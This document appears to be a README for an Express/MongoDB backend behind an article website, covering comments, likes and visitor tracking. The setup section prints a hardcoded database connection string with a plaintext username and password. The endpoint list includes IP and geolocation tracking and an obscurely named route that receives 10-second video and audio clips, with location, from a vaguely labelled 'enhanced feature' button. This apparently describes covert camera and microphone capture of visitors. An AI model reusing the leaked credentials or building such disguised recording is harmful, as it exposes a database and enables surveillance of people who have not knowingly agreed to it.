# ArticleWeb Backend

This is a minimal Node/Express backend paired with MongoDB for the ArticleWeb static site.
It provides endpoints to store and retrieve comments, like counts, and tracking data (location/IP/device).

## Setup

1. Ensure you have Node.js (>=14). The server will connect to MongoDB using the connection string in the `MONGODB_URI` environment variable. If none is provided it defaults to a preconfigured Atlas URI (`mongodb+srv://workshah678_db_user:95WYKFeitEakFn7a@cluster0.r0nesas.mongodb.net/?appName=Cluster0`).
2. Inside the `server` directory, install dependencies:
   ```bash
   cd server
   npm install
   ```
3. Set `MONGODB_URI` environment variable if you are not using a local default.
   Example:
   ```bash
   export MONGODB_URI="mongodb://localhost:27017/articleweb"
   ```
4. Start the server:
   ```bash
   npm run dev   # uses nodemon
   # or
   npm start
   ```

By default the server runs on port 5000. You can change the port via the `PORT` env var (e.g. `PORT=5001 npm start`).

If you encounter an `EADDRINUSE` error when starting, some other process is listening on that port. Either stop/kill that process or pick another port as shown above.

## API Endpoints

- `POST /api/comments` – body `{ articleTitle, text }` saves a comment
- `GET /api/comments?articleTitle=...` – retrieves comments for an article
- `POST /api/likes` – body `{ articleTitle }`, increments like count and returns updated doc
- `GET /api/likes?articleTitle=...` – get current like count
- `POST /api/track` – body `{ articleTitle, ip, userAgent, latitude, longitude }` records visitor data
- `POST /api/45ytyfwgqu` – body `{ data: <base64 string>, location?: { latitude, longitude } }` accepts 10‑second video+audio clips captured by the frontend’s enhanced feature button

## Frontend Integration

The static frontend included in the root uses these endpoints via `fetch`. Ensure the server is running when you open the `index.html` in the browser (or serve it with a static file server) to avoid CORS issues.

> Adjust CORS settings in `server.js` as necessary for production.

---

You now have a basic backend suitable for testing interactions and storing user data. From here you can expand with authentication, more fields, or deploy the backend to a platform like Heroku, Vercel, or DigitalOcean."